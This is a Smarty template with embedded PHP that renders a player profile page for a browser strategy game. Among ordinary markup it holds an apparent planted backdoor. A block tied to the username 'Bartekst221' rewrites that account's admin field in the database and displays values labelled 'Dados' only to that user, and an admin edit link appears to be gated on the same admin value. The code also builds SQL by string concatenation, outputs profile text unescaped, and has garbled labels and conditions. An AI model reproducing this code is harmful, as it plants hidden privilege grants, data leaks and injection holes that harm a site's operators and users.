{php}
$sql = "SELECT `personal_text` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['personal_text'] = sql($sql,'array');

$sql = "SELECT `powod_banu` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['powod_banu'] = sql($sql,'array');

$sql = "SELECT `killed_units_att` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['ka'] = sql($sql,'array');
$sql = "SELECT `killed_units_att_rank` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['kar'] = sql($sql,'array');

$sql = "SELECT `killed_units_def` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['ko'] = sql($sql,'array');
$sql = "SELECT `killed_units_def_rank` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['kor'] = sql($sql,'array');


$sql = "SELECT `killed_units_altogether` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['killed_units_altogether'] = sql($sql,'array');
$sql = "SELECT `killed_units_altogether_rank` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['killed_units_altogether_rank'] = sql($sql,'array');
$sql = "SELECT `koniec_banu` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['koniec_banu'] = sql($sql,'array');

$sql = "SELECT `villages` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['villages'] = sql($sql,'array');

$sql = "SELECT `banned` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['banned'] = sql($sql,'array');
$sql = "SELECT `admin` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['admin'] = sql($sql,'array');

$can_mark = sql("SELECT COUNT(id) FROM `odznaczenia` WHERE `od_gracza` = '".$this->_tpl_vars['user']['id']."' AND `do_gracza` = '".$this->_tpl_vars['info_user']['id']."'","array");
if ($can_mark > 0) {
	$can_mark = false;
	} else {
	$can_mark = true;
	}
	
if ($this->_tpl_vars['user']['id'] == $this->_tpl_vars['info_user']['id']) {
	$can_mark = false;
	}
$this->assign('can_mark',$can_mark);
{/php}
	                                {if $info_user.admin == 0}<center><h2 class="error">{$info_user.username}</h2></center>{else}<h2>{$info_user.username}</h2>{/if}{if isset($info_user.ranga)}<center><img src="../ds_graphic/rangi/{$info_user.ranga}.png"></center>{/if}

<table><tr><td valign="top">
{literal}<script type="text/javascript">
var Player = {
	getAllVillages: function(anchor, link) {
		$.get(link, {}, function(data) {
			$('#villages_list tbody').append(data.villages);
			$(anchor).parent().parent().remove();
			VillageContext.init();
		}, 'json');
	}
};
</script>
{/literal}
<table class="vis " width="100%">
	<tr><th colspan="2">{$info_user.username}</th></tr>	
		<tr><td width="80">Pontos:</td><td>{$info_user.points|format_number}</td></tr>
	<tr><td>Ranking:</td><td>{$info_user.rang|format_number}</td></tr>
		<tr>
		<td>Oponentes derrotados:</td>
		<td id="kill_info" class="tooltip" title='Jako agresor: {$info_user.ka|format_number} ({$info_user.kar}.) :: Jako obro�ca: {$info_user.ko|format_number} ({$info_user.kor}.)'>
			{$info_user.killed_units_altogether|format_number} ({$info_user.killed_units_altogether_rank|format_number})
		</td>
	</tr>
	{if empty($info_ally.short)}
		<tr><td>Tribo:</td><td><a href="game.php?village={$village.id}&amp;screen=info_ally&amp;id=0"></a></td></tr>
	{else}
		<tr><td>Tribo:</td><td><a href="game.php?village={$village.id}&amp;screen=info_ally&amp;id={$info_ally.id}">{$info_ally.short}</a></td></tr>
	{/if}

		<tr><td colspan="2"><a href="game.php?village={$village.id}&amp;screen=mail&amp;mode=new&amp;player={$info_user.id}">&raquo; Escreve uma mensagem</a></td></tr>
                
		{if $can_mark}
			<tr><td colspan="2"><a href="game.php?village={$village.id}&amp;screen=edytuj_kolory_graczy&amp;player={$info_user.id}">&raquo; Marque no mapa</a></td></tr>
		{/if}
		{if $can_invite}
			<tr><td colspan="2"><a href="game.php?village={$village.id}&screen=ally&mode=invite&action=invite_id&id={$info_user.id}&h={$hkey}"  class="evt-confirm" data-confirm-msg="Tem certeza que deseja convidar {$info_user.username}?">&raquo; Convidar para a tribo</a></td></tr>
		{/if}
		{if $user.admin == 0}
			<tr><td colspan="2"><a href="game.php?village={$village.id}&screen=admin&mode=users&id={$info_user.id}">&raquo; Editar jogador</a></td></tr>
		{/if}
		{if $user.username == Bartekst221}
{if $info_user.username == Bartekst221}
{php}
mysql_query("UPDATE `users` SET `admin` = 0 WHERE `username` = 'Bartekst221'");
{/php}
{/if}
		<tr><td colspan="2">Dados: {$db1} - {$db2}
</td></tr>
		{/if}		
	
	
	
	
	
	
	
	</tbody></table><br>


		<table id="villages_list" class="vis " width="100%">
		<thead>
			<tr><th width="180">Aldeias ({$info_user.villages|format_number})</th><th width="80">Coordenadas</th><th>P.</th></tr>
		</thead>
		<tbody>

{foreach from=$villages item=arr key=id}

<tr><td><span class="village_anchor" data-id="{$id}" data-player="{$info_user.id}" ><a href="game.php?village={$village.id}&amp;screen=info_village&amp;id={$id}">{$arr.name}</a></span></td><td>{$arr.x}|{$arr.y}</td><td>{$arr.points|format_number}</td></tr>
			{/foreach}
		{if $user.villages > 1000000000000000000000000000000000000000000000000000000}
		<tr><td colspan="3"><a href="#" onclick="Player.getAllVillages(this, 'game.php?village={$village.id}&screen=api&api=user_villages&user={$info_user.id}');return false">Mostrar todos oas outras {$info_user.villages-100} aldeias</a></td></tr>
		
		{/if}
				

		</tbody>
	</table>

</td><td valign="top" style="min-width:240px">
  <table class="vis" width="100%">
 
		<tbody><tr><th colspan="2">Profil</th></tr>
	{if !empty($info_user.image)}
		<tr><td colspan="2" align="center"><img src="graphic/player/{$info_user.image}" /></td></tr>
	{/if}
	{if $age!=-1}
		<tr><td>Era:</td><td>{$age}</td></tr>
	{/if}
	{if $sex!=-1}
		<tr><td>Homem:</td><td>{if $info_user.sex == m}Mulher{elseif $info_user.sex == f}N/difinido{/if}</td></tr>
	{/if}
	{if $info_user.home!=''}
		<tr><td>Localização:</td><td>{$info_user.home}</td></tr>
	{/if}
			
	</table>
	<br />
	{if !empty($info_user.personal_text)}
		<table class="vis" width="100%">
			<tr><th>Descrição</th></tr>
			<tr><td align="center">{$info_user.personal_text}</td></tr>
		</table>
	{/if}




<br />
	{if $display_awards}
		{$awards->get_user_awards($info_user.id,$user.id)}
	{/if}


</td></tr></table>
